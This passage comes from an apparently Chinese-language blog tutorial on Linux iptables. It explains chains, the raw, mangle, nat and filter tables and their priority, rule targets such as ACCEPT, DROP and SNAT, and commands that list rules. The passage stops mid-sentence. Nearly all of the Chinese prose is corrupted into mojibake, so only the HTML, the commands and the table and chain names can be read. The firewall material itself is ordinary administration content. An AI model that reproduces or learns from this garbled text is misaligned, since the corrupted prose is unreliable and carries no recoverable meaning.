title="é“¾çš„æ¦‚å¿µ"></a>é“¾çš„æ¦‚å¿µ</h2><p>ä¸ºä»€ä¹ˆâ€œå…³å¡â€ åœ¨ iptables ä¸­è¢«ç§°åšâ€œé“¾ï¼š</p><p>é˜²ç«å¢™çš„ä½œç”¨å°±åœ¨äºå¯¹ç»è¿‡æŠ¥æ–‡åŒ¹é…â€œè§„åˆ™â€ï¼Œç„¶åæ‰§è¡Œç›¸å¯¹åº”çš„â€œåŠ¨ä½œâ€ã€‚ç„¶è€Œå…³å¡ä¸Šä¸åªåªæœ‰ä¸€æ¡è§„åˆ™ï¼Œè€Œä¸”æœ‰å¾ˆå¤šæ¡è§„åˆ™ï¼Œå½“æˆ‘ä»¬æŠŠè¿™äº›è§„åˆ™ä¸²åˆ°ä¸€ä¸ªé“¾æ¡ä¸Šçš„æ—¶å€™ï¼Œå°±å½¢æˆäº†â€é“¾â€ã€‚</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_3.png"></p><p>æ¯ä¸ªç»è¿‡è¿™ä¸ªâ€å…³å¡â€çš„æŠ¥æ–‡ï¼Œéƒ½è¦å°†è¿™æ¡â€é“¾â€ä¸Šçš„æ‰€æœ‰è§„åˆ™åŒ¹é…ä¸€éï¼Œå¦‚æœæœ‰ç¬¦åˆæ¡ä»¶çš„è§„åˆ™ï¼Œåˆ™æ‰§è¡Œè§„åˆ™å¯¹åº”çš„åŠ¨ä½œã€‚</p><h2 id="è¡¨çš„æ¦‚å¿µ"><a href="#è¡¨çš„æ¦‚å¿µ" class="headerlink" title="è¡¨çš„æ¦‚å¿µ"></a>è¡¨çš„æ¦‚å¿µ</h2><blockquote><p>æˆ‘ä»¬å†æƒ³æƒ³å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯¹æ¯ä¸ªâ€é“¾â€ä¸Šéƒ½æ”¾ç½®äº†ä¸€ä¸²è§„åˆ™ï¼Œä½†æ˜¯è¿™äº›è§„åˆ™æœ‰äº›å¾ˆç›¸ä¼¼ï¼Œæ¯”å¦‚ï¼ŒAç±»è§„åˆ™éƒ½æ˜¯å¯¹IPæˆ–è€…ç«¯å£çš„è¿‡æ»¤ï¼ŒBç±»è§„åˆ™æ˜¯ä¿®æ”¹æŠ¥æ–‡ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½<strong>æŠŠå®ç°ç›¸åŒåŠŸèƒ½çš„è§„åˆ™æ”¾åœ¨ä¸€èµ·</strong>å‘¢ï¼Œå¿…é¡»èƒ½çš„ã€‚</p></blockquote><p>æŠŠå…·æœ‰ç›¸åŒåŠŸèƒ½çš„è§„åˆ™çš„é›†åˆå«åšâ€è¡¨â€ï¼Œæ‰€ä»¥è¯´ï¼Œä¸åŒåŠŸèƒ½çš„è§„åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥æ”¾ç½®åœ¨ä¸åŒçš„è¡¨ä¸­è¿›è¡Œç®¡ç†ï¼Œè€Œiptableså·²ç»ä¸ºæˆ‘ä»¬å®šä¹‰äº†4ç§è¡¨ï¼Œæ¯ç§è¡¨å¯¹åº”äº†ä¸åŒçš„åŠŸèƒ½ï¼Œè€Œæˆ‘ä»¬å®šä¹‰çš„è§„åˆ™ä¹Ÿéƒ½é€ƒè„±ä¸äº†è¿™4ç§åŠŸèƒ½çš„èŒƒå›´ï¼Œæ‰€ä»¥ï¼Œå­¦ä¹ iptablesä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆææ˜ç™½æ¯ç§è¡¨ çš„ä½œç”¨ã€‚</p><p>iptablesä¸ºæˆ‘ä»¬æä¾›äº†å¦‚ä¸‹è§„åˆ™çš„åˆ†ç±»ï¼Œæˆ–è€…è¯´ï¼Œiptablesä¸ºæˆ‘ä»¬æä¾›äº†å¦‚ä¸‹â€è¡¨â€</p><ul><li><p>filterè¡¨ï¼šè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œé˜²ç«å¢™ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_filter</p></li><li><p>natè¡¨ï¼šnetwork address translationï¼Œç½‘ç»œåœ°å€è½¬æ¢åŠŸèƒ½ï¼›å†…æ ¸æ¨¡å—ï¼šiptable_nat</p></li><li><p>mangleè¡¨ï¼šæ‹†è§£æŠ¥æ–‡ï¼Œåšå‡ºä¿®æ”¹ï¼Œå¹¶é‡æ–°å°è£… çš„åŠŸèƒ½ï¼›iptable_mangle</p></li><li><p>rawè¡¨ï¼šå…³é—­natè¡¨ä¸Šå¯ç”¨çš„è¿æ¥è¿½è¸ªæœºåˆ¶ï¼›iptable_raw</p></li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„æ‰€æœ‰è§„åˆ™ï¼Œéƒ½æ˜¯è¿™å››ç§åˆ†ç±»ä¸­çš„è§„åˆ™ï¼Œæˆ–è€…è¯´ï¼Œæ‰€æœ‰è§„åˆ™éƒ½å­˜åœ¨äºè¿™4å¼ â€è¡¨â€ä¸­ã€‚</p><p></p><h2 id="è¡¨é“¾å…³ç³»"><a href="#è¡¨é“¾å…³ç³»" class="headerlink" title="è¡¨é“¾å…³ç³»"></a>è¡¨é“¾å…³ç³»</h2><blockquote><p>æŸäº›â€œé“¾â€ä¸­æ³¨å®šä¸ä¼šåŒ…å«â€œæŸç±»è§„åˆ™â€ã€‚</p></blockquote><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_4.png" alt="preroutingé“¾ä¸Šçš„è§„åˆ™å­˜åœ¨çš„è¡¨æƒ…å†µ"></p><blockquote><p>preroutingâ€é“¾â€åªæ‹¥æœ‰natè¡¨ã€rawè¡¨å’Œmangleè¡¨æ‰€å¯¹åº”çš„åŠŸèƒ½ï¼Œæ‰€ä»¥ï¼Œpreroutingä¸­çš„è§„åˆ™åªèƒ½å­˜æ”¾äºnatè¡¨ã€rawè¡¨å’Œmangleè¡¨ä¸­</p></blockquote><p>PREROUTING    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨ï¼Œmangleè¡¨ï¼Œnatè¡¨ã€‚</p><p>INPUT      çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ï¼Œï¼ˆcentos7ä¸­è¿˜æœ‰natè¡¨ï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰ã€‚</p><p>FORWARD     çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ã€‚</p><p>OUTPUT     çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨mangleè¡¨ï¼Œnatè¡¨ï¼Œfilterè¡¨ã€‚</p><p>POSTROUTING    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œnatè¡¨ã€‚</p><p><strong>åœ¨å®é™…çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€æ˜¯é€šè¿‡â€è¡¨â€ä½œä¸ºæ“ä½œå…¥å£ï¼Œå¯¹è§„åˆ™è¿›è¡Œå®šä¹‰çš„</strong>ï¼Œä¹‹æ‰€ä»¥æŒ‰ç…§ä¸Šè¿°è¿‡ç¨‹ä»‹ç»iptablesï¼Œæ˜¯å› ä¸ºä»â€å…³å¡â€çš„è§’åº¦æ›´å®¹æ˜“ä»å…¥é—¨çš„è§’åº¦ç†è§£ï¼Œä½†æ˜¯ä¸ºäº†ä»¥ä¾¿åœ¨å®é™…ä½¿ç”¨çš„æ—¶å€™ï¼Œæ›´åŠ é¡ºç•…çš„ç†è§£å®ƒä»¬ï¼Œæ­¤å¤„æˆ‘ä»¬è¿˜è¦å°†å„â€è¡¨â€ä¸â€é“¾â€çš„å…³ç³»ç½—åˆ—å‡ºæ¥ï¼Œ</p><p>è¡¨ï¼ˆåŠŸèƒ½ï¼‰&lt;â€“&gt;  é“¾ï¼ˆé’©å­ï¼‰ï¼š</p><p>raw   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUT</p><p>mangle  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒINPUTï¼ŒFORWARDï¼ŒOUTPUTï¼ŒPOSTROUTING</p><p>nat   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUTï¼ŒPOSTROUTINGï¼ˆcentos7ä¸­è¿˜æœ‰INPUTï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰</p><p>filter  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šINPUTï¼ŒFORWARDï¼ŒOUTPUT</p><hr><p>å…¶å®æˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œå› ä¸ºæ•°æ®åŒ…ç»è¿‡ä¸€ä¸ªâ€é“¾â€çš„æ—¶å€™ï¼Œä¼šå°†å½“å‰é“¾çš„æ‰€æœ‰è§„åˆ™éƒ½åŒ¹é…ä¸€éï¼Œä½†æ˜¯åŒ¹é…æ—¶æ€»å½’è¦æœ‰é¡ºåºï¼Œæˆ‘ä»¬åº”è¯¥ä¸€æ¡ä¸€æ¡çš„å»åŒ¹é…ï¼Œè€Œä¸”æˆ‘ä»¬è¯´è¿‡ï¼Œç›¸åŒåŠŸèƒ½ç±»å‹çš„è§„åˆ™ä¼šæ±‡èšåœ¨ä¸€å¼ â€è¡¨â€ä¸­ï¼Œé‚£ä¹ˆï¼Œå“ªäº›â€è¡¨â€ä¸­çš„è§„åˆ™ä¼šæ”¾åœ¨â€é“¾â€çš„æœ€å‰é¢æ‰§è¡Œå‘¢ï¼Œè¿™æ—¶å€™å°±éœ€è¦æœ‰ä¸€ä¸ªä¼˜å…ˆçº§çš„é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜æ‹¿preroutingâ€é“¾â€åšå›¾ç¤ºã€‚<br><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_5.png"></p><p>preroutingé“¾ä¸­çš„è§„åˆ™å­˜æ”¾äºä¸‰å¼ è¡¨ä¸­ï¼Œè€Œè¿™ä¸‰å¼ è¡¨ä¸­çš„è§„åˆ™æ‰§è¡Œçš„ä¼˜å…ˆçº§å¦‚ä¸‹ï¼š</p><p>raw â€“&gt; mangle â€“&gt; nat</p><p>ä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œ<strong>iptablesä¸ºæˆ‘ä»¬å®šä¹‰äº†4å¼ â€è¡¨â€,å½“ä»–ä»¬å¤„äºåŒä¸€æ¡â€é“¾â€æ—¶ï¼Œæ‰§è¡Œçš„ä¼˜å…ˆçº§å¦‚ä¸‹ã€‚</strong></p><p>ä¼˜å…ˆçº§æ¬¡åºï¼ˆç”±é«˜è€Œä½ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw --&gt; mangle --&gt; nat --&gt; filter</span><br></pre></td></tr></table></figure><p>å‰é¢è¯´è¿‡ï¼ŒæŸäº›é“¾å¤©ç”Ÿå°±ä¸èƒ½ä½¿ç”¨æŸäº›è¡¨ä¸­çš„è§„åˆ™ï¼Œæ‰€ä»¥ï¼Œ<strong>4å¼ è¡¨ä¸­çš„è§„åˆ™å¤„äºåŒä¸€æ¡é“¾çš„ç›®å‰åªæœ‰outputé“¾</strong>ï¼Œå®ƒå°±æ˜¯ä¼ è¯´ä¸­æµ·é™†ç©ºéƒ½èƒ½é˜²å®ˆçš„å…³å¡ã€‚</p><h2 id="æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹"><a href="#æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹" class="headerlink" title="æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹"></a>æ•°æ®ç»è¿‡é˜²ç«å¢™çš„æµç¨‹</h2><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png"></p><p>æˆ‘ä»¬å°†ç»å¸¸ç”¨åˆ°çš„å¯¹åº”å…³ç³»é‡æ–°å†™åœ¨æ­¤å¤„ï¼Œæ–¹ä¾¿å¯¹åº”å›¾ä¾‹æŸ¥çœ‹ã€‚</p><p>é“¾çš„è§„åˆ™å­˜æ”¾äºå“ªäº›è¡¨ä¸­ï¼ˆä»é“¾åˆ°è¡¨çš„å¯¹åº”å…³ç³»ï¼‰ï¼š</p><p>PREROUTING  çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨ï¼Œmangleè¡¨ï¼Œnatè¡¨ã€‚</p><p>INPUT     çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ï¼Œï¼ˆcentos7ä¸­è¿˜æœ‰natè¡¨ï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰ã€‚</p><p>FORWARD    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œfilterè¡¨ã€‚</p><p>OUTPUT    çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šrawè¡¨mangleè¡¨ï¼Œnatè¡¨ï¼Œfilterè¡¨ã€‚</p><p>POSTROUTING  çš„è§„åˆ™å¯ä»¥å­˜åœ¨äºï¼šmangleè¡¨ï¼Œnatè¡¨ã€‚</p><hr><p>è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼ˆä»è¡¨åˆ°é“¾çš„å¯¹åº”å…³ç³»ï¼‰ï¼š</p><p>raw   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUT</p><p>mangle  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒINPUTï¼ŒFORWARDï¼ŒOUTPUTï¼ŒPOSTROUTING</p><p>nat   è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šPREROUTINGï¼ŒOUTPUTï¼ŒPOSTROUTINGï¼ˆcentos7ä¸­è¿˜æœ‰INPUTï¼Œcentos6ä¸­æ²¡æœ‰ï¼‰</p><p>filter  è¡¨ä¸­çš„è§„åˆ™å¯ä»¥è¢«å“ªäº›é“¾ä½¿ç”¨ï¼šINPUTï¼ŒFORWARDï¼ŒOUTPUT</p><p>ä¸‹å›¾ä¸­natè¡¨åœ¨centos7ä¸­çš„æƒ…å†µå°±ä¸å†æ ‡æ˜ã€‚</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_7.png"></p><h2 id="è§„åˆ™çš„æ¦‚å¿µ"><a href="#è§„åˆ™çš„æ¦‚å¿µ" class="headerlink" title="è§„åˆ™çš„æ¦‚å¿µ"></a>è§„åˆ™çš„æ¦‚å¿µ</h2><p>è§„åˆ™ï¼šæ ¹æ®æŒ‡å®šçš„åŒ¹é…æ¡ä»¶æ¥å°è¯•åŒ¹é…æ¯ä¸ªæµç»æ­¤å¤„çš„æŠ¥æ–‡ï¼Œä¸€æ—¦åŒ¹é…æˆåŠŸï¼Œåˆ™ç”±è§„åˆ™åé¢æŒ‡å®šçš„å¤„ç†åŠ¨ä½œè¿›è¡Œå¤„ç†</p><p>è§„åˆ™ç”±åŒ¹é…æ¡ä»¶å’Œå¤„ç†åŠ¨ä½œç»„æˆã€‚</p><ul><li>åŒ¹é…æ¡ä»¶</li></ul><p>åŒ¹é…æ¡ä»¶åˆ†ä¸ºåŸºæœ¬åŒ¹é…æ¡ä»¶ä¸æ‰©å±•åŒ¹é…æ¡ä»¶</p><p><strong>åŸºæœ¬åŒ¹é…æ¡ä»¶ï¼š</strong></p><p>æºåœ°å€Source IPï¼Œç›®æ ‡åœ°å€ Destination IP</p><p>ä¸Šè¿°å†…å®¹éƒ½å¯ä»¥ä½œä¸ºåŸºæœ¬åŒ¹é…æ¡ä»¶ã€‚</p><p><strong>æ‰©å±•åŒ¹é…æ¡ä»¶ï¼š</strong></p><p>é™¤äº†ä¸Šè¿°çš„æ¡ä»¶å¯ä»¥ç”¨äºåŒ¹é…ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„æ¡ä»¶å¯ä»¥ç”¨äºåŒ¹é…ï¼Œè¿™äº›æ¡ä»¶æ³›ç§°ä¸ºæ‰©å±•æ¡ä»¶ï¼Œè¿™äº›æ‰©å±•æ¡ä»¶å…¶å®ä¹Ÿæ˜¯netfilterä¸­çš„ä¸€éƒ¨åˆ†ï¼Œåªæ˜¯ä»¥æ¨¡å—çš„å½¢å¼å­˜åœ¨ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨è¿™äº›æ¡ä»¶ï¼Œåˆ™éœ€è¦ä¾èµ–å¯¹åº”çš„æ‰©å±•æ¨¡å—ã€‚</p><p>æºç«¯å£Source Port, ç›®æ ‡ç«¯å£Destination Port</p><p>ä¸Šè¿°å†…å®¹éƒ½å¯ä»¥ä½œä¸ºæ‰©å±•åŒ¹é…æ¡ä»¶</p><ul><li>å¤„ç†åŠ¨ä½œ</li></ul><p>å¤„ç†åŠ¨ä½œåœ¨iptablesä¸­è¢«ç§°ä¸ºtargetï¼ˆè¿™æ ·è¯´å¹¶ä¸å‡†ç¡®ï¼Œæˆ‘ä»¬æš‚ä¸”è¿™æ ·ç§°å‘¼ï¼‰ï¼ŒåŠ¨ä½œä¹Ÿå¯ä»¥åˆ†ä¸ºåŸºæœ¬åŠ¨ä½œå’Œæ‰©å±•åŠ¨ä½œã€‚</p><p>æ­¤å¤„åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„åŠ¨ä½œï¼Œä¹‹åçš„æ–‡ç« ä¼šå¯¹å®ƒä»¬è¿›è¡Œè¯¦ç»†çš„ç¤ºä¾‹ä¸æ€»ç»“ï¼š</p><p><strong>ACCEPT</strong>ï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡ã€‚</p><p><strong>DROP</strong>ï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™ä»»ä½•å›åº”ä¿¡æ¯ï¼Œè¿™æ—¶å€™å®¢æˆ·ç«¯ä¼šæ„Ÿè§‰è‡ªå·±çš„è¯·æ±‚æ³¥ç‰›å…¥æµ·äº†ï¼Œè¿‡äº†è¶…æ—¶æ—¶é—´æ‰ä¼šæœ‰ååº”ã€‚</p><p><strong>REJECT</strong>ï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”çš„ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åˆšè¯·æ±‚å°±ä¼šæ”¶åˆ°æ‹’ç»çš„ä¿¡æ¯ã€‚</p><p><strong>SNAT</strong>ï¼šæºåœ°å€è½¬æ¢ï¼Œè§£å†³å†…ç½‘ç”¨æˆ·ç”¨åŒä¸€ä¸ªå…¬ç½‘åœ°å€ä¸Šç½‘çš„é—®é¢˜ã€‚</p><p><strong>MASQUERADE</strong>ï¼šæ˜¯SNATçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œé€‚ç”¨äºåŠ¨æ€çš„ã€ä¸´æ—¶ä¼šå˜çš„ipä¸Šã€‚</p><p><strong>DNAT</strong>ï¼šç›®æ ‡åœ°å€è½¬æ¢ã€‚</p><p><strong>REDIRECT</strong>ï¼šåœ¨æœ¬æœºåšç«¯å£æ˜ å°„ã€‚</p><p><strong>LOG</strong>ï¼šåœ¨/var/log/messagesæ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†è®°å½•ä»¥å¤–ä¸å¯¹æ•°æ®åŒ…åšä»»ä½•å…¶ä»–æ“ä½œï¼Œä»ç„¶è®©ä¸‹ä¸€æ¡è§„åˆ™å»åŒ¹é…ã€‚</p><h1 id="iptables-å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢"><a href="#iptables-å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢" class="headerlink" title="iptables å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢"></a>iptables å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢</h1><p>iptablesä¸ºæˆ‘ä»¬é¢„å®šä¹‰äº†4å¼ è¡¨ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯rawè¡¨ã€mangleè¡¨ã€natè¡¨ã€filterè¡¨ï¼Œä¸åŒçš„è¡¨æ‹¥æœ‰ä¸åŒçš„åŠŸèƒ½ã€‚</p><p>filterè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œæ¯”å¦‚å…è®¸å“ªäº›IPåœ°å€è®¿é—®ï¼Œæ‹’ç»å“ªäº›IPåœ°å€è®¿é—®ï¼Œå…è®¸è®¿é—®å“ªäº›ç«¯å£ï¼Œç¦æ­¢è®¿é—®å“ªäº›ç«¯å£ï¼Œfilterè¡¨ä¼šæ ¹æ®æˆ‘ä»¬å®šä¹‰çš„è§„åˆ™è¿›è¡Œè¿‡æ»¤ï¼Œfilterè¡¨åº”è¯¥æ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨åˆ°çš„è¡¨äº†ï¼Œæ‰€ä»¥æ­¤å¤„ï¼Œæˆ‘ä»¬ä»¥filterè¡¨ä¸ºä¾‹ï¼Œå¼€å§‹å­¦ä¹ æ€æ ·å®é™…æ“ä½œiptablesã€‚</p><ul><li>æŸ¥çœ‹filter è¡¨ä¸­çš„è§„åˆ™</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -L</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨-té€‰é¡¹ï¼ŒæŒ‡å®šè¦æ“ä½œçš„è¡¨ï¼Œä½¿ç”¨-Lé€‰é¡¹ï¼ŒæŸ¥çœ‹-té€‰é¡¹å¯¹åº”çš„è¡¨çš„è§„åˆ™ï¼Œ-Lé€‰é¡¹çš„æ„æ€æ˜¯ï¼Œåˆ—å‡ºè§„åˆ™ï¼Œæ‰€ä»¥ï¼Œä¸Šè¿°å‘½ä»¤çš„å«ä¹‰ä¸ºåˆ—å‡ºfilterè¡¨çš„æ‰€æœ‰è§„åˆ™</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826222419.png" alt="image-20200826222325023"></p><p>ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹å‡ºï¼ŒINPUTé“¾ã€FORWARDé“¾ã€OUTPUTé“¾éƒ½æ‹¥æœ‰â€è¿‡æ»¤â€çš„èƒ½åŠ›ï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬è¦å®šä¹‰æŸæ¡â€è¿‡æ»¤â€çš„è§„åˆ™æ—¶ï¼Œæˆ‘ä»¬ä¼šåœ¨filterè¡¨ä¸­å®šä¹‰ï¼Œä½†æ˜¯å…·ä½“åœ¨å“ªæ¡â€é“¾â€ä¸Šå®šä¹‰è§„åˆ™å‘¢ï¼Ÿè¿™å–å†³äºæˆ‘ä»¬çš„å·¥ä½œåœºæ™¯ã€‚æ¯”å¦‚ï¼Œ<strong>æˆ‘ä»¬éœ€è¦ç¦æ­¢æŸä¸ªIPåœ°å€è®¿é—®æˆ‘ä»¬çš„ä¸»æœºï¼Œæˆ‘ä»¬åˆ™éœ€è¦åœ¨INPUTé“¾ä¸Šå®šä¹‰è§„åˆ™ã€‚å› ä¸ºï¼Œæˆ‘ä»¬åœ¨ç†è®ºæ€»ç»“ä¸­å·²ç»æåˆ°è¿‡ï¼ŒæŠ¥æ–‡å‘å¾€æœ¬æœºæ—¶ï¼Œä¼šç»è¿‡PREROUTINGé“¾ä¸INPUTé“¾ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ç¦æ­¢æŸäº›æŠ¥æ–‡å‘å¾€æœ¬æœºï¼Œæˆ‘ä»¬åªèƒ½åœ¨PREROUTINGé“¾å’ŒINPUTé“¾ä¸­å®šä¹‰è§„åˆ™ï¼Œä½†æ˜¯PREROUTINGé“¾å¹¶ä¸å­˜åœ¨äºfilterè¡¨ä¸­ï¼Œæ¢å¥è¯è¯´å°±æ˜¯ï¼ŒPREROUTINGå…³å¡å¤©ç”Ÿå°±æ²¡æœ‰è¿‡æ»¤çš„èƒ½åŠ›ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åªèƒ½åœ¨INPUTé“¾ä¸­å®šä¹‰</strong>ï¼Œå½“ç„¶ï¼Œå¦‚æœæ˜¯å…¶ä»–å·¥ä½œåœºæ™¯ï¼Œå¯èƒ½éœ€è¦åœ¨FORWARDé“¾æˆ–è€…OUTPUTé“¾ä¸­å®šä¹‰è¿‡æ»¤è§„åˆ™ã€‚</p><p>æŸ¥è¯¢å…¶ä»–è¡¨ä¸­çš„è§„åˆ™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -t raw -L</span><br><span class="line"></span><br><span class="line">iptables -t mangle -L</span><br><span class="line"></span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœç•¥-t filterï¼Œå½“æ²¡æœ‰ä½¿ç”¨-té€‰é¡¹æŒ‡å®šè¡¨æ—¶ï¼Œé»˜è®¤ä¸ºæ“ä½œfilterè¡¨ï¼Œå³iptables -Lè¡¨ç¤ºåˆ—å‡ºfilterè¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ã€‚</p><ul><li>æŸ¥è¯¢æŒ‡å®šè¡¨ä¸­æŒ‡å®šé“¾çš„è§„åˆ™</li></ul><p>å› ä¸ºæˆ‘çš„vps æ²¡æœ‰é…ç½®iptablesï¼Œæ‰€ä»¥å›¾ç‰‡å°±ç›´æ¥æŠ„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -L INPUT(æ³¨æ„å¤§å°å†™)</span><br><span class="line">æŸ¥è¯¢æ›´è¯¦ç»†çš„æ•°æ®å¯ä»¥ä½¿ç”¨-v é€‰é¡¹</span><br><span class="line">iptables -vL INPUT</span><br></pre></td></tr></table></figure><p><code>pkts bytes target     prot opt in     out     source               destination        </code></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_3.png"></p><p><strong>pkts</strong>:å¯¹åº”è§„åˆ™åŒ¹é…åˆ°çš„æŠ¥æ–‡çš„ä¸ªæ•°ã€‚</p><p><strong>bytes</strong>:å¯¹åº”åŒ¹é…åˆ°çš„æŠ¥æ–‡åŒ…çš„å¤§å°æ€»å’Œã€‚</p><p><strong>target</strong>:è§„åˆ™å¯¹åº”çš„targetï¼Œå¾€å¾€è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„â€åŠ¨ä½œâ€ï¼Œå³è§„åˆ™åŒ¹é…æˆåŠŸåéœ€è¦é‡‡å–çš„æªæ–½ã€‚</p><p><strong>prot</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„åè®®ï¼Œæ˜¯å¦åªé’ˆå¯¹æŸäº›åè®®åº”ç”¨æ­¤è§„åˆ™ã€‚</p><p><strong>opt</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„é€‰é¡¹ã€‚</p><p><strong>in</strong>:è¡¨ç¤ºæ•°æ®åŒ…ç”±å“ªä¸ªæ¥å£(ç½‘å¡)æµå…¥ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é€šè¿‡å“ªå—ç½‘å¡æµå…¥çš„æŠ¥æ–‡éœ€è¦åŒ¹é…å½“å‰è§„åˆ™ã€‚</p><p><strong>out</strong>:è¡¨ç¤ºæ•°æ®åŒ…ç”±å“ªä¸ªæ¥å£(ç½‘å¡)æµå‡ºï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é€šè¿‡å“ªå—ç½‘å¡æµå‡ºçš„æŠ¥æ–‡éœ€è¦åŒ¹é…å½“å‰è§„åˆ™ã€‚</p><p><strong>source</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„æºå¤´åœ°å€ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç½‘æ®µã€‚</p><p><strong>destination</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„ç›®æ ‡åœ°å€ã€‚å¯ä»¥æ˜¯ä¸€ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç½‘æ®µã€‚</p><p>ä¸Šå›¾ä¸­çš„æºåœ°å€ä¸ç›®æ 